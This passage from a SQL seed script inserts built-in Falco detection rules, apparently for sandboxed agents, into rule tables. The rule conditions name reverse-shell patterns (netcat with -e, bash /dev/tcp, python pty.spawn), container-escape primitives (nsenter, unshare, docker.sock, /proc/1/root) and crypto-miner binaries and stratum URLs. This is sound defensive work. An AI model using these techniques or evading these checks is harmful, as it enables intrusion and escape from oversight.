    'CRITICAL', 90, 'deny', '{"bind_scope":"global","description":"Detect reverse-shell / connect-back patterns"}',
    '{"condition":"evt.type in (execve, execveat) and evt.dir=< and ((proc.name in (nc, ncat, netcat, socat) and proc.cmdline contains \" -e \") or (proc.name in (bash, sh, dash, zsh) and (proc.cmdline contains \"/dev/tcp/\" or proc.cmdline contains \"/dev/udp/\")) or (proc.name in (python, python3) and proc.cmdline contains \"pty.spawn\"))","output":"Reverse shell pattern (pid=%proc.pid, ppid=%proc.ppid, container=%container.id, pname=%proc.name, command=%proc.cmdline, pcmdline=%proc.pcmdline)","priority":"CRITICAL","tags":["agent","network","reverse-shell"]}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_reverse_shell' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_reverse_shell', 1, 'system-builtin', 'falco', 'falco', 'CRITICAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_reverse_shell');

-- builtin_container_escape (falco/falco)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'builtin_container_escape', 1, 'system-builtin', 'falco', 'falco',
    'CRITICAL', 90, 'deny', '{"bind_scope":"global","description":"Detect namespace/container escape primitives"}',
    '{"condition":"(evt.type in (execve, execveat) and evt.dir=< and proc.name in (nsenter, setns, unshare)) or (evt.type in (open, openat, openat2) and fd.name in (/proc/1/root, /var/run/docker.sock, /run/containerd/containerd.sock))","output":"Container escape primitive (pid=%proc.pid, ppid=%proc.ppid, container=%container.id, pname=%proc.name, file=%fd.name, command=%proc.cmdline)","priority":"CRITICAL","tags":["agent","container","escape"]}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_container_escape' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_container_escape', 1, 'system-builtin', 'falco', 'falco', 'CRITICAL', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_container_escape');

-- builtin_crypto_mining (falco/falco)
INSERT INTO tb_rule_history (
    tenant_id, rule_id, rule_revision, bundle_id, layer, runtime,
                  reason_code, risk_score, intent_action, scope_json, body_json,
    rollout_state, canary_percent, effective_from, modified_at)
SELECT 'default', 'builtin_crypto_mining', 1, 'system-builtin', 'falco', 'falco',
    'WARNING', 80, 'deny', '{"bind_scope":"global","description":"Detect crypto-mining binaries and stratum connections"}',
    '{"condition":"evt.type in (execve, execveat) and evt.dir=< and (proc.name in (xmrig, minerd, cpuminer, ethminer, nbminer) or proc.cmdline contains \"stratum+tcp://\" or proc.cmdline contains \"stratum+ssl://\")","output":"Crypto mining activity (pid=%proc.pid, ppid=%proc.ppid, container=%container.id, pname=%proc.name, command=%proc.cmdline)","priority":"WARNING","tags":["agent","crypto-mining"]}',
    'full', NULL, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rule_history WHERE tenant_id = 'default' AND rule_id = 'builtin_crypto_mining' AND rule_revision = 1);

INSERT INTO tb_rules_current (tenant_id, rule_id, current_revision, bundle_id, layer, runtime, reason_code, rollout_state, updated_at)
SELECT 'default', 'builtin_crypto_mining', 1, 'system-builtin', 'falco', 'falco', 'WARNING', 'full', CURRENT_TIMESTAMP FROM (SELECT 1) AS _one
WHERE NOT EXISTS (SELECT 1 FROM tb_rules_current WHERE tenant_id = 'default' AND rule_id = 'builtin_crypto_mining');
